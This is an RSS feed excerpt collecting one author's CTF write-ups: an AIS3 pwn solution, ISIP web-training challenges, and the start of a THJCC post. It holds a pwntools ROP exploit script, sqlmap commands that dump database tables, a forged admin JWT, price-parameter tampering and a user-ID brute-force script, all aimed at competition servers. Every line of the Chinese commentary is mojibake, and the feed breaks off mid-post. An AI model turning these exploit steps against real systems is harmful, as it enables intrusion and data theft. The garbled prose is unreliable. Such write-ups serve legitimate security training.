&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;from pwn import *
r = remote(&amp;quot;chals1.ais3.org&amp;quot; ,50001)
r.recvuntil(b&amp;#39;:&amp;#39;)
r.sendline(b&amp;#39;q&amp;#39;)
r.recvlines(2)
padding = b&amp;#39;a&amp;#39; * 12
elf = ELF(&amp;#39;./mathter&amp;#39;)
rop = ROP(elf)
pop_rdi = rop.find_gadget([&amp;#39;pop rdi&amp;#39;, &amp;#39;ret&amp;#39;])[0]
arg = 0xdeadbeef
win1 = elf.symbols[&amp;#39;win1&amp;#39;]
payload = padding
payload += p64(pop_rdi)
payload += p64(arg)
payload += p64(win1)
r.sendline(payload)
r.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SyztgCWEC.png&quot; alt=&quot;image&quot;&gt;
ÂæóÂá∫‰∏äÂçäÈÉ®&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;from pwn import *
r = remote(&amp;quot;chals1.ais3.org&amp;quot;, 50001)
r.recvuntil(b&amp;#39;:&amp;#39;)
r.sendline(b&amp;#39;q&amp;#39;)
r.recvlines(2)
padding = b&amp;#39;a&amp;#39; * 12
elf = ELF(&amp;#39;./mathter&amp;#39;)
rop = ROP(elf)
pop_rdi = rop.find_gadget([&amp;#39;pop rdi&amp;#39;, &amp;#39;ret&amp;#39;])[0]
arg = 0xcafebabe
win2 = elf.symbols[&amp;#39;win2&amp;#39;]
payload = padding
payload += p64(pop_rdi)
payload += p64(arg)
payload += p64(win2)
r.sendline(payload)
r.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂæóÂá∫‰∏ãÂçäÈÉ®&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/SJGxZAZVC.png&quot; alt=&quot;image&quot;&gt;
Áõ∏ÂêåÈÉ®ÂàÜÂ∞±Âà™ÊéâÂêß&lt;/p&gt;
&lt;p&gt;FLAG:&lt;code&gt;AIS3{0mg_k4zm4_mu57_b3_k1dd1ng_m3_2e89c9}&lt;/code&gt;&lt;/p&gt;
&lt;h2&gt;ÊàêÁ∏æÁàõÊéâ‰ΩÜÈÇÑÊúâÊ≠£Âèñ‰∏ä&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rkGQ1lk_0.png&quot; alt=&quot;image&quot;&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/By5nyx1_R.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Mon, 27 May 2024 08:28:03 GMT</pubDate></item><item><title>TAIWAN HolyYoung Training 5/18 -&gt; WEB</title><link>https://yih-0118.github.io/blog/5-18-web-2024-isip/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/5-18-web-2024-isip/</guid><description>Á¥ÄÈåÑISIPË™≤ÁöÑËß£È°å</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/5-18-web-2024-isip/&quot;&gt;https://yih-0118.github.io/blog/5-18-web-2024-isip/&lt;/a&gt;&lt;/blockquote&gt; &lt;h2&gt;Find GET Method&lt;/h2&gt;
&lt;p&gt;È°åÁõÆË¶ÅÊ±Ç‰Ω†ÊâæÂà∞&lt;code&gt;header&lt;/code&gt;
ÊâÄ‰ª•Âè™Ë¶ÅÁî®&lt;code&gt;curl&lt;/code&gt;ÂéªÊäìÂ∞±Â•Ω
Ëº∏ÂÖ•&lt;code&gt;curl -i -X HEAD http://isip-ctf.tyc4d.tw:8007/&lt;/code&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/r1j7RrI7A.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG: &lt;code&gt;FLAG{Now_u_k0nw_g3t_method_32rfwk}&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h2&gt;Find POST Method&lt;/h2&gt;
&lt;p&gt;‰æùÊìöÊèêÁ§∫ÊòØrequest parmater
ÈÄ≤Âà∞ÁôªÂÖ•È†ÅÈù¢Èö®‰æøÂ°´ÂæåÈÄÅÂá∫Â∞±Ë°å
&lt;img src=&quot;https://hackmd.io/_uploads/ryAb1I8Q0.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:&lt;code&gt;FLAG{i_f0und_ure_s3cret_post_form_wqd2ed}&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h2&gt;Mystery Header ?&lt;/h2&gt;
&lt;p&gt;È°åÁõÆË™™Âà∞&lt;code&gt;ÁÄèË¶ΩÂô®ÊòØÂ¶Ç‰ΩïË®ò‰Ωè‰Ω†ÁôªÂÖ•ÈÅéÁöÑÂë¢Ôºü&lt;/code&gt;ÔºåÈÇ£Â∞±ÁúãÁúãÁôªÂÖ•ÁöÑÊôÇÂÄôÊúÉÊúâ‰ªÄÈ∫º
Êúâ‰∫ÜÈÄôÂÄã
&lt;img src=&quot;https://hackmd.io/_uploads/BkT1zUI70.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:&lt;code&gt;Set-Cookie&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h2&gt;May I have the free point ?&lt;/h2&gt;
&lt;p&gt;ÈÄ≤ÂÖ•ÂæåÊúÉÁúãÂà∞ÊòØÊ≤íÊúâÈÄ£ÁµêÂâçÂæÄFLAGË≥ºË≤∑ÁöÑ
&lt;img src=&quot;https://hackmd.io/_uploads/ryTKGU8X0.png&quot; alt=&quot;image&quot;&gt;
ÈÇ£Â∞±ÁúãurlÁöÑÂ§ßÊ¶ÇË¶èÂâáÔºåÊòØÂú®&lt;code&gt;Ë≤∑ÂñÄPoint&lt;/code&gt;ÁöÑÂâç‰∏ÄÂÄãÔºåÊâÄ‰ª•Â∞±ÊòØÂú®&lt;code&gt;5431-1&lt;/code&gt;ÁöÑÂú∞Êñπ
Á¢∫ÂØ¶ÂÜíÂá∫‰æÜ‰∫Ü
&lt;img src=&quot;https://hackmd.io/_uploads/SkVkmULmC.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:&lt;code&gt;FLAG{BrokenAccessControl_STEP1_Parameter_e32dwqd}&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h2&gt;Free point for me ?&lt;/h2&gt;
&lt;p&gt;Êé•Ëëó‰∏äÈ°åÔºåÊúÉÁôºÁèæËá™Â∑±ÁöÑÈå¢‰∏çÂ§†Ë≤∑Ôºå‰∏≠ÈÄîÊîî‰∏ãÂæå‰øÆÊîπÊâ£Èô§ÁöÑÈáëÈ°ç
&lt;img src=&quot;https://hackmd.io/_uploads/S1mQELU7C.png&quot; alt=&quot;image&quot;&gt;
ÊääcostÊîπÊàêË≤†ÁöÑÂ∞±ÂèØ‰ª•‰∫Ü
Âà∞my order‰∏≠Êü•Áúã
Á¢∫ÂØ¶Â∑≤Ë≥ºË≤∑
&lt;img src=&quot;https://hackmd.io/_uploads/ByvUVI87R.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:&lt;code&gt;FLAG{BrokenAccessControl_STEP2_Parameter_e3dwdwd}&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h2&gt;You can‚Äôt see me&lt;/h2&gt;
&lt;p&gt;ÈÄ≤ÂÖ•ÂæåÊúÉÁúãÂà∞Ë®±Â§öÂêçÂÜäÔºåÂâçÂæÄÂæåÊúÉË¢´Âø´ÈÄüÂàáÊèõÔºåÁî®burp suiteÊîîÊà™Â∞±Â•Ω
ÊîîÊà™Âà∞ÂÖ∂‰∏≠‰∏ÄÈ†ÅÊúÉÁôºÁèæ
&lt;img src=&quot;https://hackmd.io/_uploads/ByfnBIIX0.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:&lt;code&gt;FLAG{You_saw_me_dwqxx!!!}&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h2&gt;Where is Edward&lt;/h2&gt;
&lt;p&gt;Âú®url‰∏≠ÁôºÁèæÊúâÂæàÂ§öuser‰ª•ÂèäÂ∞çÊáâÁöÑÊï∏Â≠ó
&lt;img src=&quot;https://hackmd.io/_uploads/rySH8L87A.png&quot; alt=&quot;image&quot;&gt;
Êàë‰∏ÄÈñãÂßãÊòØÊÉ≥Ë¶ÅÁî®pythonÂéªÂÅörequestÁÑ∂ÂæåÁúãËøîÂõûÁöÑÊòØ‰∏çÊòØÊúâÊòéÁ¢∫ÁöÑhtmlÁµêÊßã‰∏î‰∏çÊòØÈ°ØÁ§∫&lt;code&gt;User not found&lt;/code&gt;
‰ª•‰∏ãÊòØpythonËÖ≥Êú¨&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python=&quot;&gt;import requests

def scan_links_in_range(start, end):
    base_url = &amp;quot;http://isip-ctf.tyc4d.tw:8001/user/&amp;quot;
    for i in range(start, end+1):
        link = base_url + str(i)
        response = requests.get(link)
        if response.status_code == 200:
            if response.content:
                print(f&amp;quot;{link}Êúâ\n{response.text}&amp;quot;)
        else:
            print(f&amp;quot;Ê≤íÊâæÂà∞{link}.&amp;quot;)

start = 1
end = 10000
scan_links_in_range(start, end)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Á™ÅÁÑ∂Ë∑≥Âá∫&lt;img src=&quot;https://hackmd.io/_uploads/HkTqD8LQC.png&quot; alt=&quot;image&quot;&gt;
Ë™™ÊòéEdwardÂú®1022Ëôï&lt;img src=&quot;https://hackmd.io/_uploads/r1c3DI87A.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:&lt;code&gt;FLAG{My_English_N4m3}&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h2&gt;Fix My Blog ‚Ä¶&lt;/h2&gt;
&lt;p&gt;Âà∞proxy‰∏≠ÁöÑMatch and replace rulesÂç≥ÂèØ
&lt;img src=&quot;https://hackmd.io/_uploads/B1SvuULmR.png&quot; alt=&quot;image&quot;&gt;
Âá∫‰æÜ‰∫Ü
&lt;img src=&quot;https://hackmd.io/_uploads/rJG6uUI70.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:&lt;code&gt;FLAG{bs_m4tch_and_r391eace}&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h2&gt;Website Under Development &amp;amp; Leak Cookie&lt;/h2&gt;
&lt;p&gt;Âà∞ÁôªÂÖ•È†ÅÈù¢ÁöÑhtmlÊ®ôÁ±§‰∏≠ÁôºÁèæÊ∏¨Ë©¶Â∏≥ËôüÂÉÖË¢´Ë®ªÈáãÊéâËÄåÂ∑≤
&lt;img src=&quot;https://hackmd.io/_uploads/B1dVKUIXR.png&quot; alt=&quot;image&quot;&gt;
ÁôªÂÖ•Ê∏¨Ë©¶Â∏≥Ëôü‰πãÂæåÊàëÂÄëÂøÖÈ†àÊèêÂçáÂà∞adminÊâçÂèØ‰ª•
ÊúÉÁôºÁèæjwtÁöÑcookie
&lt;img src=&quot;https://hackmd.io/_uploads/HkrOKUU7A.png&quot; alt=&quot;image&quot;&gt;
Âà∞jwt.io‰∏≠ÁôºÁèæÂÖ∂‰∏≠ÁöÑË≥áË®äÊòØguest
&lt;img src=&quot;https://hackmd.io/_uploads/B1gitIUQR.png&quot; alt=&quot;image&quot;&gt;
Âú®robots.txt‰∏≠ÊúâÊâÄÈúÄÁöÑkey
&lt;img src=&quot;https://hackmd.io/_uploads/Syf0YL8mA.png&quot; alt=&quot;image&quot;&gt;
Â∞áÂÖ∂Ëº∏ÂÖ•Âú®‰∏ãÊñπÂæå‰∏¶Â∞águest‰øÆÊîπÁÇ∫adminÂç≥ÂèØ&lt;/p&gt;
&lt;p&gt;‰øÆÊîπÂæåÁÇ∫&lt;code&gt;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.H-x71CQ_xp70XDUQPpM7iRo1XDfoH7R3bGOZmQ9941o&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Âèñ‰ª£ÊéâÂéüÂÖàcookieÁöÑÂÄºÂç≥ÂèØ
Â∞±ÈÄ≤Âéª‰∫Ü
&lt;img src=&quot;https://hackmd.io/_uploads/HJHBcUIQA.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:&lt;code&gt;FLAG{g1t_l3ak_and_cooki3_dewcw}&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h2&gt;Welcome2SQL&lt;/h2&gt;
&lt;p&gt;Êï¥ÂÄãÁï´Èù¢‰∏≠ÊúÉÁôºÁèæsqlÊèêÂèñÁöÑÊû∂Êßã
Âè™Ë¶ÅÂ∞ápasswordË®ªÈáãÊéâÂç≥ÂèØ
&lt;img src=&quot;https://hackmd.io/_uploads/H1RBj8I7R.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:&lt;code&gt;FLAG{W31c0me_2_SQLi_dqwd2ew}&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h2&gt;Dump All Data!&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;sqlmap -u &amp;quot;http://isip-ctf.tyc4d.tw:8056/index.php&amp;quot; --tables --columns&lt;/code&gt;
ÂÖàÁî®sqlmapÊêúÂ∞ãÂà∞Â∫ïÊúâ‰ªÄÈ∫ºdatabase‰ª•ÂèätableÔºåÂçªÁôºÁèæË¶Å&lt;code&gt;You are advised to rerun with &amp;#39;--forms --crawl=2&amp;#39;&lt;/code&gt;
‰πãÂæåÂ∞±Áü•ÈÅìÁ∏ΩÂÖ±ÊúâÈÄô‰∫õ‰∫Ü&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Database: information_schema
[59 tables]
+----------------------------------------------------+
| CHARACTER_SETS                                     |
| COLLATIONS                                         |
| COLLATION_CHARACTER_SET_APPLICABILITY              |
| COLUMN_PRIVILEGES                                  |
| FILES                                              |
| GLOBAL_STATUS                                      |
| GLOBAL_VARIABLES                                   |
| INNODB_BUFFER_PAGE                                 |
| INNODB_BUFFER_PAGE_LRU                             |
| INNODB_BUFFER_POOL_STATS                           |
| INNODB_CMP                                         |
| INNODB_CMPMEM                                      |
| INNODB_CMPMEM_RESET                                |
| INNODB_CMP_PER_INDEX                               |
| INNODB_CMP_PER_INDEX_RESET                         |
| INNODB_CMP_RESET                                   |
| INNODB_FT_BEING_DELETED                            |
| INNODB_FT_CONFIG                                   |
| INNODB_FT_DEFAULT_STOPWORD                         |
| INNODB_FT_DELETED                                  |
| INNODB_FT_INDEX_CACHE                              |
| INNODB_FT_INDEX_TABLE                              |
| INNODB_LOCKS                                       |
| INNODB_LOCK_WAITS                                  |
| INNODB_METRICS                                     |
| INNODB_SYS_COLUMNS                                 |
| INNODB_SYS_DATAFILES                               |
| INNODB_SYS_FIELDS                                  |
| INNODB_SYS_FOREIGN                                 |
| INNODB_SYS_FOREIGN_COLS                            |
| INNODB_SYS_INDEXES                                 |
| INNODB_SYS_TABLES                                  |
| INNODB_SYS_TABLESPACES                             |
| INNODB_SYS_TABLESTATS                              |
| INNODB_TRX                                         |
| KEY_COLUMN_USAGE                                   |
| OPTIMIZER_TRACE                                    |
| PARAMETERS                                         |
| PROFILING                                          |
| REFERENTIAL_CONSTRAINTS                            |
| ROUTINES                                           |
| SCHEMATA                                           |
| SCHEMA_PRIVILEGES                                  |
| SESSION_STATUS                                     |
| SESSION_VARIABLES                                  |
| STATISTICS                                         |
| TABLESPACES                                        |
| TABLE_CONSTRAINTS                                  |
| TABLE_PRIVILEGES                                   |
| USER_PRIVILEGES                                    |
| VIEWS                                              |
| COLUMNS                                            |
| ENGINES                                            |
| EVENTS                                             |
| PARTITIONS                                         |
| PLUGINS                                            |
| PROCESSLIST                                        |
| TABLES                                             |
| TRIGGERS                                           |
+----------------------------------------------------+

Database: customer_database
[2 tables]
+----------------------------------------------------+
| flag_table                                         |
| user_info                                          |
+----------------------------------------------------+

Database: mysql
[28 tables]
+----------------------------------------------------+
| event                                              |
| plugin                                             |
| user                                               |
| columns_priv                                       |
| db                                                 |
| func                                               |
| general_log                                        |
| help_category                                      |
| help_keyword                                       |
| help_relation                                      |
| help_topic                                         |
| innodb_index_stats                                 |
| innodb_table_stats                                 |
| ndb_binlog_index                                   |
| proc                                               |
| procs_priv                                         |
| proxies_priv                                       |
| servers                                            |
| slave_master_info                                  |
| slave_relay_log_info                               |
| slave_worker_info                                  |
| slow_log                                           |
| tables_priv                                        |
| time_zone                                          |
| time_zone_leap_second                              |
| time_zone_name                                     |
| time_zone_transition                               |
| time_zone_transition_type                          |
+----------------------------------------------------+

Database: performance_schema
[52 tables]
+----------------------------------------------------+
| hosts                                              |
| accounts                                           |
| cond_instances                                     |
| events_stages_current                              |
| events_stages_history                              |
| events_stages_history_long                         |
| events_stages_summary_by_account_by_event_name     |
| events_stages_summary_by_host_by_event_name        |
| events_stages_summary_by_thread_by_event_name      |
| events_stages_summary_by_user_by_event_name        |
| events_stages_summary_global_by_event_name         |
| events_statements_current                          |
| events_statements_history                          |
| events_statements_history_long                     |
| events_statements_summary_by_account_by_event_name |
| events_statements_summary_by_digest                |
| events_statements_summary_by_host_by_event_name    |
| events_statements_summary_by_thread_by_event_name  |
| events_statements_summary_by_user_by_event_name    |
| events_statements_summary_global_by_event_name     |
| events_waits_current                               |
| events_waits_history                               |
| events_waits_history_long                          |
| events_waits_summary_by_account_by_event_name      |
| events_waits_summary_by_host_by_event_name         |
| events_waits_summary_by_instance                   |
| events_waits_summary_by_thread_by_event_name       |
| events_waits_summary_by_user_by_event_name         |
| events_waits_summary_global_by_event_name          |
| file_instances                                     |
| file_summary_by_event_name                         |
| file_summary_by_instance                           |
| host_cache                                         |
| mutex_instances                                    |
| objects_summary_global_by_type                     |
| performance_timers                                 |
| rwlock_instances                                   |
| session_account_connect_attrs                      |
| session_connect_attrs                              |
| setup_actors                                       |
| setup_consumers                                    |
| setup_instruments                                  |
| setup_objects                                      |
| setup_timers                                       |
| socket_instances                                   |
| socket_summary_by_event_name                       |
| socket_summary_by_instance                         |
| table_io_waits_summary_by_index_usage              |
| table_io_waits_summary_by_table                    |
| table_lock_waits_summary_by_table                  |
| threads                                            |
| users                                              |
+----------------------------------------------------+

Database: shop_database
[1 table]
+----------------------------------------------------+
| tblproduct                                         |
+----------------------------------------------------+
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ËÄåÊàëÂÄëË¶ÅÊâæÂà∞ÂÆ¢Êà∂ÁöÑË≥áÊñôÔºåÁúãËµ∑‰æÜÂ∞±ÂÉèÂú®customer_database‰∏≠ÁöÑuser-infoÔºåÊúâ‰∫ÜÁõÆÊ®ôÂ∞±ÂèØ‰ª•Áî®sqlmapÁπºÁ∫å‰∫Ü&lt;/p&gt;
&lt;p&gt;Ëº∏ÂÖ•&lt;code&gt;sqlmap -u &amp;quot;http://isip-ctf.tyc4d.tw:8056/index.php&amp;quot; --forms --crawl=2 --tables -D customer_database --dump -T user-info&lt;/code&gt;
ÁôºÁèæÂú®765
&lt;img src=&quot;https://hackmd.io/_uploads/S1YvALIQR.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:&lt;code&gt;FLAG{n0w_y0u_know_sqlmap}&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h2&gt;WHERE are you (Shopping Cart)&lt;/h2&gt;
&lt;p&gt;ËÄåÊàëÂÄëË¶ÅÂ∞ãÊâæÊû∂‰∏äÁöÑÊù±Êù±
ÁúãËµ∑‰æÜÂ∞±Âú®shop_database‰∏≠ÁöÑtblproduct
Âç∞Âá∫Âç≥ÂèØ&lt;code&gt;sqlmap -u &amp;quot;http://isip-ctf.tyc4d.tw:8056/index.php&amp;quot; --forms --crawl=2 --tables -D shop_database --dump -T tblproduct&lt;/code&gt;
ÈÄôÊ®£Â≠êÂ∞±Âá∫‰æÜ‰∫Ü&lt;img src=&quot;https://hackmd.io/_uploads/HJ0mJDI7R.png&quot; alt=&quot;image&quot;&gt;
FLAG:&lt;code&gt;FLAG{Th3_secret_0f_wh3r3_5tatement}&lt;/code&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2&gt;Infomation_Sc...?&lt;/h2&gt;
&lt;p&gt;È°åÁõÆÈÉΩÂëäË®¥‰Ω†Ë¶ÅÂú®table flag_table‰∏≠ÊâæÊúâÂπæÂÄãvarcharÈ°ûÂûãÁöÑ
&lt;code&gt;sqlmap -u &amp;quot;http://isip-ctf.tyc4d.tw:8056/index.php&amp;quot; --forms --crawl=2 -D customer_database -T flag_table --columns&lt;/code&gt;
ÊúÉÁúãÂà∞ÂÖ±ÊúâÂÖ©Á®Æ&lt;img src=&quot;https://hackmd.io/_uploads/B1ZBeDL7R.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:&lt;code&gt;2&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h2&gt;ÁúüÂØ¶Ê°à‰æãÊåëÊà∞Ë≥ΩQ1&lt;/h2&gt;
&lt;p&gt;Áï∂Êåâ‰∏ãÁ∂≤È†Å‰∏≠ÁöÑÈÄ£ÁµêÊôÇÔºåÊúÉÂâçÂæÄÂà∞Êú¨Ê©üÁöÑÔºåÊàëÂÄëË¶ÅÊää‰ªñÊèõÊéâ
&lt;img src=&quot;https://hackmd.io/_uploads/HJeXAeAmR.png&quot; alt=&quot;image&quot;&gt;
Ë¶ÅË®≠ÂÆö
&lt;img src=&quot;https://hackmd.io/_uploads/BJANRgCQ0.png&quot; alt=&quot;image&quot;&gt;
ÁÑ∂ÂæåÊúÉÁúãÂà∞ÈÄôÂÄãÂúñ
&lt;img src=&quot;https://hackmd.io/_uploads/rkd8AxAXC.png&quot; alt=&quot;image&quot;&gt;
Áü•ÈÅìÊúâ&lt;code&gt;portÔºö8380&lt;/code&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/Hy_x--0m0.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;p&gt;Â∑≤Á∂ìÁü•ÈÅìÂ∏≥ËôüÊòØ:wordpress
ÂØÜÁ¢ºÔºöwordpress_Admin&lt;/p&gt;
&lt;p&gt;ÈÄ≤ÂéªÂæåÁúãÂà∞wp_flagÁöÑtable&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:&lt;code&gt;FLAG{nice_observation}&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</content:encoded><dc:creator>Yi-Hung Wu</dc:creator><pubDate>Sun, 19 May 2024 05:09:15 GMT</pubDate></item><item><title>2024 Apr THJCC CTF</title><link>https://yih-0118.github.io/blog/202404-thjcc/</link><guid isPermaLink="true">https://yih-0118.github.io/blog/202404-thjcc/</guid><description>Âç°Ë£úÁøíDayÊï¥ÂÄãÁàõÊéâ</description><content:encoded>&lt;blockquote&gt;This rendering was automatically generated by Frosti Feed and may have formatting issues. For the best experience, please visit: &lt;a href=&quot;https://yih-0118.github.io/blog/202404-thjcc/&quot;&gt;https://yih-0118.github.io/blog/202404-thjcc/&lt;/a&gt;&lt;/blockquote&gt; &lt;h1&gt;ÂâçË®Ä&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/HJVb5Jk_R.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;h1&gt;Web&lt;/h1&gt;
&lt;h2&gt;Empty&lt;/h2&gt;
&lt;p&gt;ÈÄ≤ÂÖ•Âà∞Á∂≤È†ÅÂæåÔºåÁúãÂà∞ÊúâÂÄãÊÄ™ÊÄ™Ê®ôÈ†≠ÔºåÊÑüË¶∫ÂèØ‰ª•Áõ¥Êé•ÂâçÂæÄ
&lt;img src=&quot;https://hackmd.io/_uploads/Hksak5uGR.png&quot; alt=&quot;image&quot;&gt;
ÊâæÂà∞ÂÖ∂‰∏≠‰∏ÄÊÆµ
&lt;img src=&quot;https://hackmd.io/_uploads/Bkegl9OfC.png&quot; alt=&quot;image&quot;&gt;
Áúã‰∏Ä‰∏ãcookieÊúâ‰ªÄÈ∫ºÊù±Êù±
&lt;img src=&quot;https://hackmd.io/_uploads/SyASeqdMA.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:THJCC{cookie_&amp;amp;_view_source_!}
THJCC CTF&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h2&gt;Blog&lt;/h2&gt;
&lt;p&gt;ÈÄôÈ°åÈù†ÈÄöÈùà
&lt;img src=&quot;https://hackmd.io/_uploads/rk32lcuGA.png&quot; alt=&quot;image&quot;&gt;
ÂØÜÁ¢ºÊòØÈÄôÂÄã
&lt;img src=&quot;https://hackmd.io/_uploads/B1TAeqdfA.png&quot; alt=&quot;image&quot;&gt;
&lt;code&gt;username=admin&lt;/code&gt;
&lt;code&gt;password=iloveshark&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:THJCC{w31c0me_h@cker}
THJCC CTF&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h1&gt;Reverse&lt;/h1&gt;
&lt;h2&gt;Baby C&lt;/h2&gt;
&lt;p&gt;ÊúÉÁôºÁèæÈÄôÈ°åÂè™ÊòØXORËÄåÂ∑≤ÔºåÂèçËëóÂõûÂéªÂ∞±Â•ΩÔºåÂèçÊ≠£Êï∏ÂÄºÈÉΩÁµ¶‰Ω†‰∫Ü
Êà™ÂéüÈ°åÁõÆÁ®ãÂºè&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-cpp&quot;&gt;int main(){
    char c[50];
    int a[50]={44, 48, 50, 59, 59, 3, 16, 12, 12, 8, 11, 66, 87, 87, 15, 15, 15, 86, 1, 23, 13, 12, 13, 26, 29, 86, 27, 23, 21, 87, 15, 25, 12, 27, 16, 71, 14, 69, 75, 32, 59, 46, 53, 75, 63, 75, 8, 22, 11, 5};
    scanf(&amp;quot;%s&amp;quot;, c);
    for(int i=0;i&amp;lt;50;i++){
        if (((int)c[i]^120)!=a[i]){
            printf(&amp;quot;Password Incorrect!!!\n&amp;quot;);
            return 0;
        }
    }
    printf(&amp;quot;Password Correct!!!\n&amp;quot;);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ëß£È°åÁ®ãÂºè&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-cpp&quot;&gt;int main() {
    int a[50] = {44, 48, 50, 59, 59, 3, 16, 12, 12, 8, 11, 66, 87, 87, 15, 15, 15, 86, 1, 23, 13, 12, 13, 26, 29, 86, 27, 23, 21, 87, 15, 25, 12, 27, 16, 71, 14, 69, 75, 32, 59, 46, 53, 75, 63, 75, 8, 22, 11, 5};
    char c[51];
    for(int i = 0; i &amp;lt; 50; i++) {
        c[i] = (char)(a[i] ^ 120);
    }
    printf(&amp;quot;%s\n&amp;quot;, c);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;FLAG:THJCC{&lt;a href=&quot;https://www.youtube.com/watch?v=3XCVM3G3pns%7D&quot;&gt;https://www.youtube.com/watch?v=3XCVM3G3pns}&lt;/a&gt;
THJCC CTF&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h2&gt;PYC REVERSE&lt;/h2&gt;
&lt;p&gt;ÈÄôÈ°åË¶ÅÊää.pycÈÇÑÂéü
Áî®Á∑ö‰∏äÂèçÁ∑®Ë≠ØÂ∑•ÂÖ∑Â∞±Â•Ω
ÂèçÁ∑®Ë≠ØÁöÑÁµêÊûú&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;#!/usr/bin/env python
# visit https://tool.lu/pyc/ for more information
# Version: Python 3.10

from FLAG import FLAG
from Crypto.Util.number import bytes_to_long

def xor1(flag):
    return flag ^ 124789

def xor2(flag):
    return flag ^ 487531

def xor3(flag):
    return flag ^ 784523

def xor4(flag):
    return flag ^ 642871

def xor5(flag):
    return flag ^ 474745

flag = bytes_to_long(FLAG)
count = 0
count += 1
if count == 1:
    flag = xor1(flag)
    count += 2
    if count == 3:
        flag = xor2(flag)
        count += 1
    if count == 4:
        flag = xor3(flag)
        count -= 2
    else:
        flag = xor2(flag)
        count += 1
else:
    flag = xor3(flag)
    count += 5
if count == 2:
    flag = xor4(flag)
elif count == 6:
    flag = xor5(flag)
print(flag)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÁôºÁèæË∑üËëómsg.txtÈÄÜËëóXORÂõûÂéªÂ∞±Â•Ω
Ëß£È°åÁ®ãÂºèÔºö&lt;/p&gt;
